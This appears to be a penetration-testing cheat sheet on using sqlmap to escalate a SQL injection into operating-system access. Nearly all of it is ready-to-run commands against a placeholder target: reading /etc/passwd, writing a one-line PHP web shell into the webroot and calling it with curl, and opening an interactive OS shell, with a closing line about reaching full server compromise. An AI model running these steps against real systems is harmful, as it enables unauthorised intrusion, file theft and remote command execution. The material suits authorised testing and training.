### SQLMap OS Exploitation

SQLMap can exploit SQL injection vulnerabilities to interact with the operating system of the database server. This includes reading/writing files and achieving OS command execution.
### Checking DBA Privileges

Use `--is-dba` to check if the current DB user has DBA privileges:

```bash
sqlmap -u "http://target.com/?id=1" --is-dba
```
### Reading Local Files

Read files on the server using `--file-read`:

```bash
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"
```

File will be saved under:

```
~/.sqlmap/output/<target>/files/_etc_passwd
```
### Writing Files to Remote Server

Prepare a PHP web shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Write it to the remote webroot:

```bash
sqlmap -u "http://target.com/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

Test the shell:

```bash
curl http://target.com/shell.php?cmd=whoami
```
### Getting an Interactive OS Shell

Use `--os-shell` to attempt command execution:

```bash
sqlmap -u "http://target.com/?id=1" --os-shell
```

If needed, specify SQLi technique:

```bash
sqlmap -u "http://target.com/?id=1" --os-shell --technique=E
```

SQLMap may upload a PHP backdoor and allow interactive shell commands. Type `x` or `q` to exit.
### Notes

- DBA privileges often required for file write and command execution.
- Techniques used depend on DBMS (e.g., `xp_cmdshell` for MSSQL).
- SQLMap automates UDF creation for Linux shells on MySQL.    
- Use `--batch` to skip interactive prompts.

With these features, SQLMap can pivot from DB access to full server compromise if permissions allow.
# Tags
> #Exploitation #Service-Exploitation #MySQL #SQLmap #SQL-injection